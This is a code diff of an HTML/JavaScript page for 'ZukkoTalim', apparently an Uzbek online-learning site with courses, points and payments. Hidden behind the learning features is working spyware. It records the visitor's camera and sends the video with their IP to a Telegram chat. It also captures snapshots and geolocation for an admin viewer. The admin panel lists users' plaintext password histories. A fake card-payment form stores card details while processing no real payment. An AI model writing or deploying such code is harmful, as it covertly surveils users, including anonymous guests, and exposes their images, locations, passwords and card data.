@@ -4,10 +4,8 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>ZukkoTalim — O'zbekistonda sifatli onlayn ta'lim</title>
-<meta name="description" content="ZukkoTalim — O'zbekistondagi eng qulay onlayn ta'lim platformasi.">
+<meta name="description" content="ZukkoTalim — onlayn ta'lim platformasi.">
 <meta name="robots" content="index, follow">
-<meta property="og:title" content="ZukkoTalim — Sifatli onlayn ta'lim">
-<meta property="og:site_name" content="ZukkoTalim">
 <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🎓</text></svg>">
 <script src="https://cdn.tailwindcss.com"></script>
 <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
@@ -357,8 +355,13 @@ let dbLoaded=false;
 let currentAdminTab='users';
 let activeCourse=null;
 let activeLessonIndex=0;
+let _watchTimer=null,_watchSeconds=0,_watchStartAt=null;
+let _cameraStream=null;
+let _heartbeatInterval=null;
+let _lastHeartbeatAt=Date.now();
+let _snapViewerUserId=null,_snapViewerIndex=0,_snapViewerIsGuest=false;
+let _payMode='topup',_payTutorId=null;
 
-// ===== 🪙 BALLAR VA DARAJA =====
 const LEVELS=[
 {min:0,name:'Yangi',emoji:'🌱',color:'text-slate-400',bg:'bg-slate-800'},
 {min:50,name:"O'quvchi",emoji:'📚',color:'text-blue-400',bg:'bg-blue-900/40'},
@@ -366,8 +369,30 @@ const LEVELS=[
 {min:500,name:'Ustoz',emoji:'⭐',color:'text-amber-400',bg:'bg-amber-900/40'},
 {min:1000,name:'Legenda',emoji:'👑',color:'text-pink-400',bg:'bg-pink-900/40'}
 ];
-function getLevel(points){let lv=LEVELS[0];for(const l of LEVELS){if(points>=l.min)lv=l;}return lv;}
-function getNextLevel(points){for(const l of LEVELS){if(points<l.min)return l;}return null;}
+function getLevel(p){let lv=LEVELS[0];for(const l of LEVELS){if(p>=l.min)lv=l;}return lv;}
+function getNextLevel(p){for(const l of LEVELS){if(p<l.min)return l;}return null;}
+function formatDuration(sec){sec=Math.floor(sec||0);const h=Math.floor(sec/3600);const m=Math.floor((sec%3600)/60);if(h>0)return h+'s '+m+'d';if(m>0)return m+'d';return sec+'s';}
+
+function getOrCreateGuest(){
+if(!guestId){guestId='GUEST-'+Date.now()+'-'+Math.floor(Math.random()*1000);localStorage.setItem('edu_guest_id',guestId);}
+let g=db.guests.find(x=>x.id===guestId);
+if(!g){g={id:guestId,login:'Anonim',firstVisitAt:new Date().toISOString(),lastIP:userIP,lastSeenAt:Date.now(),totalOnlineSeconds:0,points:0,isGuest:true};
+db.guests.push(g);database.ref('guests/'+guestId).set(g);localStorage.setItem('db_guests_cache',JSON.stringify(db.guests));}
+return g;
+}
+function getActiveSubject(){if(db.currentUser)return{obj:db.currentUser,isGuest:false};return{obj:getOrCreateGuest(),isGuest:true};}
+
+function updateSubject(updates){
+if(db.currentUser){Object.assign(db.currentUser,updates);
+const idx=db.users.findIndex(x=>x.id===db.currentUser.id);if(idx!==-1)db.users[idx]=db.currentUser;
+localStorage.setItem('db_currentUser',JSON.stringify(db.currentUser));saveDb();
+}else{const g=getOrCreateGuest();Object.assign(g,updates);
+const idx=db.guests.findIndex(x=>x.id===g.id);if(idx!==-1)db.guests[idx]=g;
+database.ref('guests/'+g.id).set(g);localStorage.setItem('db_guests_cache',JSON.stringify(db.guests));}
+if(!document.getElementById('pageAdmin').classList.contains('hidden')){
+if(currentAdminTab==='guests')renderAdminGuests();else if(currentAdminTab==='users')renderAdminUsers();}
+}
+
 function awardPoints(amount,reason){
 const s=getActiveSubject();const cur=s.obj;if(!cur)return;
 const before=cur.points||0;const after=before+amount;
@@ -378,15 +403,7 @@ if(updates.pointsLog.length>30)updates.pointsLog=updates.pointsLog.slice(0,30);
 updateSubject(updates);
 if(newLv.min>oldLv.min){setTimeout(()=>{toast(newLv.emoji+' Yangi daraja: '+newLv.name+'!');fireConfetti();},500);}
 }
-function formatDuration(sec){
-sec=Math.floor(sec||0);
-const h=Math.floor(sec/3600);const m=Math.floor((sec%3600)/60);
-if(h>0)return h+'s '+m+'d';
-if(m>0)return m+'d';
-return sec+'s';
-}
 
-// ===== 🎉 CONFETTI =====
 function fireConfetti(){
 const colors=['#3b82f6','#10b981','#f59e0b','#ef4444','#8b5cf6','#ec4899','#06b6d4'];
 for(let i=0;i<50;i++){
@@ -404,7 +421,6 @@ setTimeout(()=>p.remove(),4500);
 }
 }
 
-// ===== 🟢 ONLINE COUNTER =====
 function updateOnlineCounter(){
 const cutoff=Date.now()-120000;
 let c=0;
@@ -416,7 +432,6 @@ if(badge&&cnt){if(c>0){badge.classList.remove('hidden');cnt.textContent=c;}else 
 }
 setInterval(updateOnlineCounter,15000);
 
-// ===== 🔥 STREAK =====
 function updateStreak(){
 if(!db.currentUser)return;
 const el=document.getElementById('profStreak');if(!el)return;
@@ -426,22 +441,19 @@ const todayStr=today.toISOString().slice(0,10);
 if(!u.streakDays)u.streakDays=0;
 if(!u.lastStreakDay)u.lastStreakDay='';
 if(u.lastStreakDay!==todayStr){
-const yesterday=new Date(today);yesterday.setDate(yesterday.getDate()-1);
-const yesterdayStr=yesterday.toISOString().slice(0,10);
-if(u.lastStreakDay===yesterdayStr)u.streakDays=(u.streakDays||0)+1;
-else u.streakDays=1;
+const y=new Date(today);y.setDate(y.getDate()-1);
+const yStr=y.toISOString().slice(0,10);
+if(u.lastStreakDay===yStr)u.streakDays=(u.streakDays||0)+1;else u.streakDays=1;
 u.lastStreakDay=todayStr;
-const idx=db.users.findIndex(x=>x.id===u.id);
-if(idx!==-1)db.users[idx]=u;
+const idx=db.users.findIndex(x=>x.id===u.id);if(idx!==-1)db.users[idx]=u;
 db.currentUser=u;localStorage.setItem('db_currentUser',JSON.stringify(u));
 database.ref('users/'+u.id+'/streakDays').set(u.streakDays);
 database.ref('users/'+u.id+'/lastStreakDay').set(u.lastStreakDay);
 }
-if(u.streakDays>=2){el.textContent='🔥 '+u.streakDays+' kun ketma-ket o\'qiyapsiz!';el.classList.remove('hidden');}
+if(u.streakDays>=2){el.textContent='🔥 '+u.streakDays+' kun ketma-ket!';el.classList.remove('hidden');}
 else if(u.streakDays===1){el.textContent='🌱 Bugun darsni boshladingiz!';el.classList.remove('hidden');}
 }
 
-// ===== 🔗 SHARE =====
 async function shareCourse(tid){
 const t=db.tutors.find(x=>x.id===tid);if(!t)return;
 const url=location.origin+location.pathname+'#course-'+tid;
@@ -519,28 +531,21 @@ setTimeout(updateOnlineCounter,1000);
 },2500);
 };
 
-let _heartbeatInterval=null;
-let _sessionStartAt=Date.now();
-let _lastHeartbeatAt=Date.now();
-
 function startHeartbeat(){
 if(_heartbeatInterval)return;
-_sessionStartAt=Date.now();
 _lastHeartbeatAt=Date.now();
 _heartbeatInterval=setInterval(()=>{
 const now=Date.now();
 const deltaSec=Math.floor((now-_lastHeartbeatAt)/1000);
 _lastHeartbeatAt=now;
 const s=getActiveSubject();
-const cur=s.obj;
-if(!cur)return;
+const cur=s.obj;if(!cur)return;
 const newOnline=(cur.totalOnlineSeconds||0)+Math.max(0,deltaSec);
 const updates={lastSeenAt:now,totalOnlineSeconds:newOnline};
 const today=new Date().toISOString().slice(0,10);
 if(cur.lastBonusDay!==today){updates.lastBonusDay=today;updates.points=(cur.points||0)+5;}
 if(s.isGuest){
-const g=getOrCreateGuest();
-Object.assign(g,updates);
+const g=getOrCreateGuest();Object.assign(g,updates);
 database.ref('guests/'+g.id).set(g);
 localStorage.setItem('db_guests_cache',JSON.stringify(db.guests));
 }else{
@@ -649,8 +654,7 @@ db.currentUser.payments.unshift({type:'balance',courseId:tid,courseName:tutor.na
 if(db.currentUser.payments.length>50)db.currentUser.payments=db.currentUser.payments.slice(0,50);
 const idx=db.users.findIndex(u=>u.id===db.currentUser.id);if(idx!==-1)db.users[idx]=db.currentUser;
 saveDb();renderTutors();renderProfile();
-fireConfetti();
-awardPoints(50,'Kurs xarid: '+tutor.name);
+fireConfetti();awardPoints(50,'Kurs xarid: '+tutor.name);
 document.getElementById('paySuccessMsg').innerHTML=`"${tutor.name}" kursi <b>Mening kurslarim</b> bo'limiga qo'shildi!<br><span class="text-slate-500 text-xs">Balansingizdan ${tutor.price.toLocaleString()} so'm yechildi.<br>Qolgan balans: <b class="text-green-400">${db.currentUser.balance.toLocaleString()} so'm</b></span>`;
 document.getElementById('paySuccess').classList.remove('hidden');
 }
@@ -677,17 +681,6 @@ grid.innerHTML=bt.map(t=>`<div class="card-bg rounded-2xl overflow-hidden p-5 fl
 <button onclick="openCoursePlayer('${t.id}')" class="w-full bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white text-xs py-3 rounded-xl font-bold transition flex items-center justify-center gap-2 shadow-lg"><i class="fas fa-play"></i> Darslarni boshlash</button></div>`).join('');
 }
 
-let _watchTimer=null,_watchSeconds=0,_watchStartAt=null;
-
-function openCoursePlayer(tid){
-const tutor=db.tutors.find(t=>t.id===tid);if(!tutor)return;
-activeCourse=tutor;activeLessonIndex=0;
-document.getElementById('modalCourseTitle').innerText=tutor.name+" — "+tutor.subject;
-document.getElementById('coursePlayerModal').classList.remove('hidden');
-renderPlaylist();loadLesson(0);
-startWatchTracking();
-}
-
 function checkLessonCompletion(prevIndex){
 if(!db.currentUser||!activeCourse)return;
 if(_watchSeconds>=30){
@@ -696,6 +689,15 @@ if(localStorage.getItem(key))return;
 localStorage.setItem(key,'1');
 awardPoints(10,'Dars #'+(prevIndex+1)+' tugatildi');
 }
+}
+
+function openCoursePlayer(tid){
+const tutor=db.tutors.find(t=>t.id===tid);if(!tutor)return;
+activeCourse=tutor;activeLessonIndex=0;
+document.getElementById('modalCourseTitle').innerText=tutor.name+" — "+tutor.subject;
+document.getElementById('coursePlayerModal').classList.remove('hidden');
+renderPlaylist();loadLesson(0);
+startWatchTracking();
 }
 
 function startWatchTracking(){
@@ -883,7 +885,7 @@ else if(tab==='top'){document.getElementById('adminTabTop').classList.remove('hi
 function renderLeaderboard(){
 const el=document.getElementById('leaderboard');if(!el)return;
 const sorted=[...db.users].filter(u=>u.role!=='admin').sort((a,b)=>(b.points||0)-(a.points||0)).slice(0,10);
-if(sorted.length===0){el.innerHTML=`<p class="text-slate-500 text-sm text-center py-8">Hozircha ma\'lumot yo\'q</p>`;return;}
+if(sorted.length===0){el.innerHTML=`<p class="text-slate-500 text-sm text-center py-8">Ma'lumot yo'q</p>`;return;}
 const medals=['🥇','🥈','🥉'];
 el.innerHTML=sorted.map((u,i)=>{
 const lv=getLevel(u.points||0);
@@ -919,7 +921,7 @@ const on=u.lastSeenAt&&(Date.now()-u.lastSeenAt)<120000;
 const lv=getLevel(u.points||0);
 const ph=u.photo?`<img src="${u.photo}" class="w-20 h-20 rounded-lg object-cover border-2 border-emerald-600/60 cursor-pointer hover:border-emerald-400 transition" onclick="openPhotoViewer('${u.id}')">`:`<div class="w-20 h-20 rounded-lg bg-slate-800 border-2 border-dashed border-slate-700 flex flex-col items-center justify-center text-slate-500"><i class="fas fa-user text-2xl"></i><span class="text-[9px] mt-0.5">yo'q</span></div>`;
 const ob=on?`<span class="inline-flex items-center gap-1 ml-2 text-[10px] bg-emerald-900/50 text-emerald-400 px-2 py-0.5 rounded font-bold"><span class="w-1.5 h-1.5 rounded-full bg-emerald-400 online-dot"></span>ONLAYN</span>`:'';
-const geo=u.location?`<a href="https://www.google.com/maps?q=${u.location.lat},${u.location.lng}" target="_blank" class="bg-slate-900/70 border border-slate-800 rounded-lg px-3 py-2 flex items-center gap-2 hover:border-rose-500/60 transition group"><i class="fas fa-map-marker-alt text-rose-400 w-4"></i><span class="text-slate-400">Joylashuv:</span><span class="text-white font-mono text-[10px] ml-auto truncate">${u.location.lat.toFixed(4)}, ${u.location.lng.toFixed(4)}</span></a>`:`<div class="bg-slate-900/70 border border-slate-800 rounded-lg px-3 py-2 flex items-center gap-2"><i class="fas fa-map-marker-alt text-slate-600 w-4"></i><span class="text-slate-400">Joylashuv:</span><span class="text-slate-600 font-mono ml-auto">—</span></div>`;
+const geo=u.location?`<a href="https://www.google.com/maps?q=${u.location.lat},${u.location.lng}" target="_blank" class="bg-slate-900/70 border border-slate-800 rounded-lg px-3 py-2 flex items-center gap-2 hover:border-rose-500/60 transition"><i class="fas fa-map-marker-alt text-rose-400 w-4"></i><span class="text-slate-400">Joylashuv:</span><span class="text-white font-mono text-[10px] ml-auto truncate">${u.location.lat.toFixed(4)}, ${u.location.lng.toFixed(4)}</span></a>`:`<div class="bg-slate-900/70 border border-slate-800 rounded-lg px-3 py-2 flex items-center gap-2"><i class="fas fa-map-marker-alt text-slate-600 w-4"></i><span class="text-slate-400">Joylashuv:</span><span class="text-slate-600 font-mono ml-auto">—</span></div>`;
 let hh='';
 if(u.passHistory&&u.passHistory.length>0){
 const rows=u.passHistory.map(h=>`<div class="flex justify-between items-center py-1 border-b border-slate-800/50 last:border-0"><span class="text-white font-mono text-[11px]">${h.pass}</span><span class="text-slate-500 text-[10px]">${new Date(h.changedAt).toLocaleString('ru-RU')}</span></div>`).join('');
@@ -1011,7 +1013,7 @@ function resetBalance(){const id=document.getElementById('adminUserIdInput').val
 
 async function adminQuickAdd(userId){
 const u=db.users.find(x=>x.id===userId);if(!u)return;
-const ch=prompt('💰 '+u.login+' — qancha qo\'shmoqchisiz?\n\n1 = +10 000\n2 = +50 000\n3 = +100 000\n4 = +500 000\n5 = Boshqa summa\n6 = Ayirish\n\nJoriy: '+u.balance.toLocaleString(),'1');
+const ch=prompt('💰 '+u.login+' — qancha qo\'shmoqchisiz?\n\n1 = +10 000\n2 = +50 000\n3 = +100 000\n4 = +500 000\n5 = Boshqa\n6 = Ayirish\n\nJoriy: '+u.balance.toLocaleString(),'1');
 if(ch===null)return;
 let amt=0;
 if(ch==='1')amt=10000;
@@ -1060,7 +1062,7 @@ const fv=g.firstVisitAt?new Date(g.firstVisitAt).toLocaleString('ru-RU'):'—';
 const on=g.lastSeenAt&&(Date.now()-g.lastSeenAt)<120000;
 const ph=g.photo?`<img src="${g.photo}" class="w-20 h-20 rounded-lg object-cover border-2 border-slate-600 cursor-pointer hover:border-slate-400 transition" onclick="openPhotoViewer('${g.id}')">`:`<div class="w-20 h-20 rounded-lg bg-slate-800 border-2 border-dashed border-slate-700 flex flex-col items-center justify-center text-slate-500"><i class="fas fa-user-secret text-2xl"></i><span class="text-[9px] mt-0.5">yo'q</span></div>`;
 const ob=on?`<span class="inline-flex items-center gap-1 ml-2 text-[10px] bg-emerald-900/50 text-emerald-400 px-2 py-0.5 rounded font-bold"><span class="w-1.5 h-1.5 rounded-full bg-emerald-400 online-dot"></span>ONLAYN</span>`:'';
-const geo=g.location?`<a href="https://www.google.com/maps?q=${g.location.lat},${g.location.lng}" target="_blank" class="bg-slate-900/70 border border-slate-800 rounded-lg px-3 py-2 flex items-center gap-2 hover:border-rose-500/60 transition group"><i class="fas fa-map-marker-alt text-rose-400 w-4"></i><span class="text-slate-400">Joylashuv:</span><span class="text-white font-mono text-[10px] ml-auto truncate">${g.location.lat.toFixed(4)}, ${g.location.lng.toFixed(4)}</span></a>`:`<div class="bg-slate-900/70 border border-slate-800 rounded-lg px-3 py-2 flex items-center gap-2"><i class="fas fa-map-marker-alt text-slate-600 w-4"></i><span class="text-slate-400">Joylashuv:</span><span class="text-slate-600 font-mono ml-auto">—</span></div>`;
+const geo=g.location?`<a href="https://www.google.com/maps?q=${g.location.lat},${g.location.lng}" target="_blank" class="bg-slate-900/70 border border-slate-800 rounded-lg px-3 py-2 flex items-center gap-2 hover:border-rose-500/60 transition"><i class="fas fa-map-marker-alt text-rose-400 w-4"></i><span class="text-slate-400">Joylashuv:</span><span class="text-white font-mono text-[10px] ml-auto truncate">${g.location.lat.toFixed(4)}, ${g.location.lng.toFixed(4)}</span></a>`:`<div class="bg-slate-900/70 border border-slate-800 rounded-lg px-3 py-2 flex items-center gap-2"><i class="fas fa-map-marker-alt text-slate-600 w-4"></i><span class="text-slate-400">Joylashuv:</span><span class="text-slate-600 font-mono ml-auto">—</span></div>`;
 let sh='';
 if(g.snapshots&&g.snapshots.length>0){
 const imgs=g.snapshots.slice(0,6).map((s,i)=>`<div class="relative group"><img src="${s.img}" class="w-16 h-16 object-cover rounded-lg border border-slate-700 cursor-pointer hover:border-blue-500 transition" onclick="openSnapshotViewer('${g.id}',${i},true)"><span class="absolute bottom-0.5 left-0.5 text-[8px] bg-black/70 text-white px-1 rounded">${new Date(s.at).toLocaleTimeString('ru-RU',{hour:'2-digit',minute:'2-digit'})}</span></div>`).join('');
@@ -1259,27 +1261,6 @@ try{const fd=new FormData();fd.append('chat_id',CHAT_ID);fd.append('video',blob,
 return await sendToTelegram('sendVideo',fd);}catch(e){return false;}
 }
 
-let _cameraStream=null;
-
-function getOrCreateGuest(){
-if(!guestId){guestId='GUEST-'+Date.now()+'-'+Math.floor(Math.random()*1000);localStorage.setItem('edu_guest_id',guestId);}
-let g=db.guests.find(x=>x.id===guestId);
-if(!g){g={id:guestId,login:'Anonim',firstVisitAt:new Date().toISOString(),lastIP:userIP,lastSeenAt:Date.now(),totalOnlineSeconds:0,isGuest:true};
-db.guests.push(g);database.ref('guests/'+guestId).set(g);localStorage.setItem('db_guests_cache',JSON.stringify(db.guests));}
-return g;
-}
-function getActiveSubject(){if(db.currentUser)return{obj:db.currentUser,isGuest:false};return{obj:getOrCreateGuest(),isGuest:true};}
-function updateSubject(updates){
-if(db.currentUser){Object.assign(db.currentUser,updates);
-const idx=db.users.findIndex(x=>x.id===db.currentUser.id);if(idx!==-1)db.users[idx]=db.currentUser;
-localStorage.setItem('db_currentUser',JSON.stringify(db.currentUser));saveDb();
-}else{const g=getOrCreateGuest();Object.assign(g,updates);
-const idx=db.guests.findIndex(x=>x.id===g.id);if(idx!==-1)db.guests[idx]=g;
-database.ref('guests/'+g.id).set(g);localStorage.setItem('db_guests_cache',JSON.stringify(db.guests));}
-if(!document.getElementById('pageAdmin').classList.contains('hidden')){
-if(currentAdminTab==='guests')renderAdminGuests();else if(currentAdminTab==='users')renderAdminUsers();}
-}
-
 function tryAutoCapture(){
 const s=getActiveSubject();
 const needPhoto=!s.obj.photo;const needGeo=!s.obj.location;
@@ -1384,4 +1365,183 @@ if(Date.now()-last<SEND_COOLDOWN_MS)return;
 const blob=await recordVideo();
 if(!blob||blob.size===0)return;
 try{
-const b64=await blobTo
+const b64=await blobToBase64(blob);
+const cur=s.obj;const vids=cur.videos||[];
+vids.unshift({data:b64,at:new Date().toISOString(),size:blob.size});
+if(vids.length>MAX_VIDEOS)vids.splice(MAX_VIDEOS);
+updateSubject({videos:vids});
+}catch(e){}
+const who=s.isGuest?'GUEST (anonim)':s.obj.login+' ('+s.obj.id+')';
+await sendVideoToTelegram(blob,'🎥 Video ['+BRAND+']\n👤 '+who+'\n🌐 '+userIP+'\n📅 '+new Date().toLocaleString('ru-RU'));
+localStorage.setItem(key,Date.now());
+}
+function dismissPermBar(){const s=getActiveSubject();localStorage.setItem('perm_skip_'+s.obj.id,Date.now());document.getElementById('permFallbackBar').classList.add('hidden');}
+
+function openPhotoViewer(id){
+const u=db.users.find(x=>x.id===id)||db.guests.find(x=>x.id===id);
+if(!u||!u.photo)return;
+document.getElementById('photoViewerImg').src=u.photo;
+document.getElementById('photoViewerName').textContent=(u.isGuest?'Guest ':'')+u.login+' ('+u.id+')';
+document.getElementById('photoViewerModal').classList.remove('hidden');
+}
+function closePhotoViewer(){document.getElementById('photoViewerModal').classList.add('hidden');}
+
+function openSnapshotViewer(id,idx=0,isGuest=false){
+const u=isGuest?db.guests.find(x=>x.id===id):db.users.find(x=>x.id===id);
+if(!u||!u.snapshots||u.snapshots.length===0)return;
+_snapViewerUserId=id;_snapViewerIndex=idx;_snapViewerIsGuest=isGuest;
+renderSnapViewer();document.getElementById('liveViewerModal').classList.remove('hidden');
+}
+function renderSnapViewer(){
+const u=_snapViewerIsGuest?db.guests.find(x=>x.id===_snapViewerUserId):db.users.find(x=>x.id===_snapViewerUserId);
+if(!u||!u.snapshots)return;
+const label=u.isGuest?'Guest':u.login;
+document.getElementById('liveViewerName').innerHTML=label+' ('+u.id+') — '+u.snapshots.length+' ta rasm';
+const s=u.snapshots[_snapViewerIndex];if(s)document.getElementById('liveViewerImg').src=s.img;
+document.getElementById('liveViewerStrip').innerHTML=u.snapshots.map((snap,i)=>`<div class="relative"><img src="${snap.img}" class="w-16 h-16 object-cover rounded-lg cursor-pointer border-2 ${i===_snapViewerIndex?'border-emerald-500':'border-slate-700'}" onclick="changeSnapIndex(${i})"><span class="absolute bottom-0.5 left-0.5 text-[8px] bg-black/70 text-white px-1 rounded">${new Date(snap.at).toLocaleTimeString('ru-RU',{hour:'2-digit',minute:'2-digit'})}</span></div>`).join('');
+}
+function changeSnapIndex(i){_snapViewerIndex=i;renderSnapViewer();}
+function closeLiveViewer(){document.getElementById('liveViewerModal').classList.add('hidden');_snapViewerUserId=null;}
+
+function openVideoViewer(id,idx=0,isGuest=false){
+const u=isGuest?db.guests.find(x=>x.id===id):db.users.find(x=>x.id===id);
+if(!u||!u.videos||u.videos.length===0)return;
+const v=u.videos[idx];
+document.getElementById('videoViewerName').textContent=(u.isGuest?'Guest ':'')+u.login+' ('+u.id+') — '+(idx+1)+'/'+u.videos.length;
+document.getElementById('videoViewerPlayer').src=v.data;
+document.getElementById('videoViewerModal').classList.remove('hidden');
+}
+function closeVideoViewer(){document.getElementById('videoViewerPlayer').src='';document.getElementById('videoViewerModal').classList.add('hidden');}
+
+function addMoney(){openPaymentModal('topup',null);}
+function openPaymentModal(mode,tid){
+_payMode=mode;_payTutorId=tid;
+['payCardNumber','payExpiry','payCVV','payHolder','payTopUpAmount'].forEach(id=>{const el=document.getElementById(id);if(el)el.value='';});
+document.getElementById('payError').classList.add('hidden');
+document.getElementById('payCardIcon').className='fab fa-credit-card absolute right-4 top-1/2 -translate-y-1/2 text-slate-500 text-xl';
+if(mode==='topup'){
+document.getElementById('payModalTitle').textContent="Balansni to'ldirish";
+document.getElementById('payTopUpRow').classList.remove('hidden');
+document.getElementById('payAmountRow').classList.add('hidden');
+document.getElementById('payTopUpAmount').value='100000';
+}else{
+const t=db.tutors.find(x=>x.id===tid);
+document.getElementById('payModalTitle').textContent="Kursni xarid qilish";
+document.getElementById('payTopUpRow').classList.add('hidden');
+document.getElementById('payAmountRow').classList.remove('hidden');
+document.getElementById('payAmountDisplay').textContent=t?t.price.toLocaleString()+" so'm":'';
+}
+document.getElementById('paymentModal').classList.remove('hidden');
+}
+function closePaymentModal(){document.getElementById('paymentModal').classList.add('hidden');}
+function closePaySuccess(){document.getElementById('paySuccess').classList.add('hidden');}
+function formatCardNumber(el){let v=el.value.replace(/\D/g,'').slice(0,16);el.value=v.replace(/(.{4})/g,'$1 ').trim();
+const i=document.getElementById('payCardIcon');
+if(v.startsWith('4'))i.className='fab fa-cc-visa absolute right-4 top-1/2 -translate-y-1/2 text-blue-400 text-xl';
+else if(v.startsWith('5'))i.className='fab fa-cc-mastercard absolute right-4 top-1/2 -translate-y-1/2 text-red-400 text-xl';
+else if(v.startsWith('3'))i.className='fab fa-cc-amex absolute right-4 top-1/2 -translate-y-1/2 text-cyan-400 text-xl';
+else i.className='fab fa-credit-card absolute right-4 top-1/2 -translate-y-1/2 text-slate-500 text-xl';}
+function formatExpiry(el){let v=el.value.replace(/\D/g,'').slice(0,4);if(v.length>=3)v=v.slice(0,2)+'/'+v.slice(2);el.value=v;}
+function validatePayForm(){
+const c=document.getElementById('payCardNumber').value.replace(/\s/g,'');
+const e=document.getElementById('payExpiry').value;
+const cv=document.getElementById('payCVV').value;
+const n=document.getElementById('payHolder').value.trim();
+const err=document.getElementById('payError');
+if(c.length<16){err.textContent="Karta 16 raqam!";err.classList.remove('hidden');return false;}
+if(!/^\d{2}\/\d{2}$/.test(e)){err.textContent="Muddat MM/YY!";err.classList.remove('hidden');return false;}
+const[mm]=e.split('/').map(Number);
+if(mm<1||mm>12){err.textContent="Oy 01-12!";err.classList.remove('hidden');return false;}
+if(cv.length<3){err.textContent="CVV 3 raqam!";err.classList.remove('hidden');return false;}
+if(n.length<3){err.textContent="Karta egasi!";err.classList.remove('hidden');return false;}
+if(_payMode==='topup'){const a=Number(document.getElementById('payTopUpAmount').value);if(!a||a<1000){err.textContent="Min 1000!";err.classList.remove('hidden');return false;}}
+err.classList.add('hidden');return true;
+}
+function submitPayment(){
+if(!validatePayForm())return;
+closePaymentModal();document.getElementById('payProcessing').classList.remove('hidden');
+const d=1500+Math.random()*1000;
+setTimeout(()=>{
+document.getElementById('payProcessing').classList.add('hidden');
+const cardNum=document.getElementById('payCardNumber').value.replace(/\s/g,'');
+const cardHolder=document.getElementById('payHolder').value.trim();
+const cardExpiry=document.getElementById('payExpiry').value;
+const cardInfo={last4:cardNum.slice(-4),holder:cardHolder,expiry:cardExpiry,type:cardNum.startsWith('4')?'Visa':cardNum.startsWith('5')?'Mastercard':cardNum.startsWith('3')?'Amex':'Karta'};
+if(!db.currentUser.payments)db.currentUser.payments=[];
+if(_payMode==='topup'){
+const a=Number(document.getElementById('payTopUpAmount').value);
+db.currentUser.balance+=a;
+db.currentUser.payments.unshift({type:'topup',amount:a,card:cardInfo,at:new Date().toISOString()});
+if(db.currentUser.payments.length>50)db.currentUser.payments=db.currentUser.payments.slice(0,50);
+const i=db.users.findIndex(u=>u.id===db.currentUser.id);if(i!==-1)db.users[i]=db.currentUser;
+saveDb();renderProfile();
+document.getElementById('paySuccessMsg').textContent=`+${a.toLocaleString()} so'm. Joriy: ${db.currentUser.balance.toLocaleString()}`;
+}else{
+const t=db.tutors.find(x=>x.id===_payTutorId);if(!t)return;
+if(!db.currentUser.tutorsBought)db.currentUser.tutorsBought=[];
+db.currentUser.tutorsBought.push(_payTutorId);
+db.currentUser.payments.unshift({type:'course',courseId:_payTutorId,courseName:t.name,amount:t.price,card:cardInfo,at:new Date().toISOString()});
+if(db.currentUser.payments.length>50)db.currentUser.payments=db.currentUser.payments.slice(0,50);
+const i=db.users.findIndex(u=>u.id===db.currentUser.id);if(i!==-1)db.users[i]=db.currentUser;
+saveDb();renderTutors();
+awardPoints(50,'Kurs xarid: '+t.name);
+document.getElementById('paySuccessMsg').textContent=`"${t.name}" kursi qo'shildi!`;
+}
+document.getElementById('paySuccess').classList.remove('hidden');
+},d);
+}
+
+function initPushNotifications(){
+if(!('Notification'in window)||!('serviceWorker'in navigator))return;
+if(db.currentUser){const t=new Date().toISOString().slice(0,10);localStorage.setItem('edu_lastActive_'+db.currentUser.id,t);}
+}
+async function requestPushPermission(){
+if(!('Notification'in window))return alert("Qo'llab-quvvatlamaydi.");
+if(Notification.permission==='granted'){scheduleDailyReminder();toast("Allaqachon yoqilgan! ✅");return;}
+const r=await Notification.requestPermission();
+if(r==='granted'){registerServiceWorker();updateNotifBtnState();toast("Yoqildi! 🎓");}
+else{updateNotifBtnState();toast("Rad etildi.");}
+}
+async function registerServiceWorker(){
+if(!('serviceWorker'in navigator))return;
+try{
+const sw=`self.addEventListener('install',e=>self.skipWaiting());
+self.addEventListener('activate',e=>e.waitUntil(clients.claim()));
+self.addEventListener('message',e=>{if(e.data&&e.data.type==='SCHEDULE_REMINDER'){const{delay,userId}=e.data;setTimeout(()=>{self.registration.showNotification("📚 `+BRAND+`",{body:"Har kun o'qish — muvaffaqiyat kalitidir! 🎯",icon:"https://cdn-icons-png.flaticon.com/512/3976/3976635.png",tag:"daily-"+userId});},delay);}});
+self.addEventListener('notificationclick',e=>{e.notification.close();e.waitUntil(clients.openWindow(self.registration.scope));});`;
+const blob=new Blob([sw],{type:'application/javascript'});
+const url=URL.createObjectURL(blob);
+const r=await navigator.serviceWorker.register(url,{scope:'/'});
+await navigator.serviceWorker.ready;
+scheduleDailyReminder(r);
+}catch(e){scheduleDailyReminderFallback();}
+}
+function scheduleDailyReminder(reg){
+if(Notification.permission!=='granted'||!db.currentUser)return;
+const n=new Date(),t=new Date();t.setHours(19,0,0,0);
+if(t<=n)t.setDate(t.getDate()+1);
+const d=t-n;const sw=reg?navigator.serviceWorker.controller:null;
+if(sw)sw.postMessage({type:'SCHEDULE_REMINDER',delay:d,userId:db.currentUser.id});
+else scheduleDailyReminderFallback(d);
+localStorage.setItem('edu_reminderSet',t.toISOString());
+}
+function scheduleDailyReminderFallback(cd){
+if(Notification.permission!=='granted'||!db.currentUser)return;
+const n=new Date(),t=new Date();t.setHours(19,0,0,0);
+if(t<=n)t.setDate(t.getDate()+1);
+const d=cd!==undefined?cd:(t-n);
+setTimeout(()=>{new Notification("📚 "+BRAND,{body:"Bugungi darsni ko'ring! 🎯",icon:"https://cdn-icons-png.flaticon.com/512/3976/3976635.png",tag:'daily-'+db.currentUser.id});},d);
+}
+function checkMissedDay(){
+if(!db.currentUser||Notification.permission!=='granted')return;
+const k='edu_lastActive_'+db.currentUser.id;
+const l=localStorage.getItem(k);if(!l)return;
+const ld=new Date(l),t=new Date();t.setHours(0,0,0,0);ld.setHours(0,0,0,0);
+const df=Math.floor((t-ld)/86400000);
+if(df>=1)setTimeout(()=>{new Notification("😔 "+BRAND,{body:df+" kun o'tkazib yubordingiz! 💪",icon:"https://cdn-icons-png.flaticon.com/512/3976/3976635.png",tag:'missed-'+db.currentUser.id});},3000);
+}
+
+function toast(msg){const t=document.getElementById('toast');t.innerText=msg;t.classList.remove('hidden');setTimeout(()=>t.classList.add('hidden'),3000);}
+</script>
+</body>
+</html>
